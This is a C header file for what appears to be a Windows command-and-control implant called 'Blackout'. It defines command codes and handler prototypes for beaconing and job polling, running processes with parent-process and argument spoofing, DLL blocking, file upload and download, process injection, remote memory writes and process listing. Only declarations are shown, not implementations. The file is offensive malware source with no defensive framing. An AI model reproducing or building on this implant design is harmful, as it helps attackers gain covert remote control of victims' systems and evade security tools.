#include <windows.h>
#include <package.h>

#define BLACKOUT_ERROR           0x099
#define BLACKOUT_CHECKIN         0x055
#define BLACKOUT_DEBUG           0x066

#define COMMAND_REGISTER         0x100
#define COMMAND_GET_JOB          0x101
#define COMMAND_NO_JOB           0x102

#define COMMAND_SLEEP            0x111
#define COMMAND_RUN              0x120
#define COMMAND_PPID             0x121
#define COMMAND_BLOCKDLLS        0x122
#define COMMAND_ARGUE            0x123
#define COMMAND_UPLOAD           0x130
#define COMMAND_DOWNLOAD         0x140
#define COMMAND_CLASSIC          0x151

#define COMMAND_EXITP            0x160
#define COMMAND_EXITT            0x161
#define COMMAND_PROCLIST         0x170
#define COMMAND_EXPLORER         0x180

#define COMMAND_MEMORY           0x300

#define COMMAND_OUTPUT           0x200

typedef enum _EXPLR {
    LS  = 0x181,
    CD  = 0x182,
    PWD = 0x183,
    CAT = 0x184
} EXPLR;

typedef enum _MEM {
    ALLOC   = 0x301,
    WRITE   = 0x302,
    PROTECT = 0x303,
    QUERY   = 0x304
} MEM;

typedef struct
{
    INT ID;
    VOID ( *Function ) ( PPARSER Arguments );
} BLACKOUT_COMMAND;

// Functions
VOID CommandDispatcher();

VOID CommandCheckin(
    _In_ PPARSER Parser
);

VOID CommandRun(
    _In_ PPARSER Parser
);

VOID CommandExplorer(
    _In_ PPARSER Parser
);

VOID CommandSleep(
    PPARSER Parser
);

VOID CommandExitProcess(
    PPARSER Parser
);

VOID CommandExitThread(
    PPARSER Parser
);

VOID CommandMemory( 
    _In_ PPARSER Parser    
);

VOID CommandClassicInjection(
    PPARSER Parser
);

VOID CommandProcEnum(
    _In_ PPARSER Parser
);